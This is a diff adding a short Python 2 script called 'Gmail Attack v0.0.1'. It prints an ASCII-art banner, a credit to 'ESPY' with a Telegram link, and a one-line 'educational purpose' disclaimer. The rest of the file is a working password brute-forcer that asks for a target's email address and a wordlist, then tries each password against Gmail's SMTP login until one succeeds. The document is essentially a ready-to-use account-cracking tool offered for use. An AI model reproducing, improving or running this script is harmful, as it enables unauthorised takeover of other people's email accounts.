@@ -1,0 +1,38 @@
+# Program: Gmail Attack v0.0.1
+
+
+
+print"           8888888888888   888        888       8       888 888 "
+print"         888888888888888   8888      8888     88 88     888 888 "
+print"        888                888 88  88 888   88     88   888 888  "
+print"       888                 888   88   888 888       888 888 888  "
+print"       888       888888888 888    8   888 888       888 888 888 "
+print"       888       888  8888 888        888 8888888888888 888 888 "
+print"       888       888  8888 888        888 8888888888888 888 888         8888      88  8888888888  88    8888 88  88 "
+print"        888           8888 888        888 888       888 888 888         8888     8888 8888888888 8888 88     88 8   "
+print"         8888888888888888  888        888 888       888 888 8888888888888888 888 8888   88  88   8888 88     88 8    "
+print"           88888888888888  888        888 888       888 888 8888888888888888 888 8  8   88  88   8  8   8888 88  88  "
+print"       ____________________________________________________________________________________________________________  "
+print"                      Created by: ESPY        Telegram: t.me/securiteinfos             Version 0.0.1 Beta           "
+print"       ============================================================================================================ "
+
+
+print" Disclaimer- This tool is only for educational purpose"
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = raw_input("Enter the target's email address: ")
+passwfile = raw_input("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+	try:
+		smtpserver.login(user, password)
+
+		print "[+] Password Found: %s" % password
+		break;
+	except smtplib.SMTPAuthenticationError:
+		print "[!] Password Incorrect: %s" % password
